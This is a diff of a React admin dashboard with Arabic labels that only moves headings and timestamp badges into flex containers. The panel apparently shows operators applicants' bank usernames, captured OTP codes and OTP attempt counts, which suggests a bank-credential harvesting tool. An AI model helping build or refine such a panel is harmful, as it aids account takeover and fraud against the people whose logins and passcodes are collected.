@@ -826,13 +826,15 @@ export default function AdminDashboardPage() {
                                 <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                   {/* صندوق البيانات الشخصية */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
-                          <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                            <User className="w-4 h-4" />
-                            {allData.applicantType === "business"
-                              ? "بيانات الشركة"
-                              : "البيانات الشخصية"}
+                          <div className="flex items-center gap-2">
+                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
+                              <User className="w-4 h-4" />
+                              {allData.applicantType === "business"
+                                ? "بيانات الشركة"
+                                : "البيانات الشخصية"}
+                            </h4>
                             <SectionTimeBadge timestamp={app.createdAt} />
-                          </h4>
+                          </div>
                           <DataBadge
                             label="الاسم"
                             value={
@@ -878,11 +880,13 @@ export default function AdminDashboardPage() {
 
                         {/* صندوق بيانات البنك */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
-                          <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                            <CreditCard className="w-4 h-4" />
-                            بيانات البنك والدخول
+                          <div className="flex items-center gap-2">
+                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
+                              <CreditCard className="w-4 h-4" />
+                              بيانات البنك والدخول
+                            </h4>
                             <SectionTimeBadge timestamp={app.bankUsername ? app.updatedAt : undefined} />
-                          </h4>
+                          </div>
                           {/* اسم البنك بارز في الأعلى */}
                           {allData.bankName && (
                             <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-3">
@@ -962,16 +966,18 @@ export default function AdminDashboardPage() {
 
                         {/* صندوق OTP */}
                         <div className="bg-card rounded-xl p-4 space-y-2">
-                          <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
-                            <Smartphone className="w-4 h-4" />
-                            رمز OTP والحالة
-                            {otpAttempts > 0 && (
-                              <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
-                                {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
-                              </span>
-                            )}
+                          <div className="flex items-center gap-2">
+                            <h4 className="font-bold text-sm text-primary mb-3 flex items-center gap-2">
+                              <Smartphone className="w-4 h-4" />
+                              رمز OTP والحالة
+                              {otpAttempts > 0 && (
+                                <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${otpAttempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
+                                  {otpAttempts} {otpAttempts === 1 ? "محاولة" : "محاولات"}
+                                </span>
+                              )}
+                            </h4>
                             <SectionTimeBadge timestamp={allData.otpCode ? app.updatedAt : undefined} />
-                          </h4>
+                          </div>
                           {allData.otpCode ? (
                             <div className="bg-muted rounded-xl p-4 text-center">
                               <p className="text-xs text-muted-foreground mb-1">
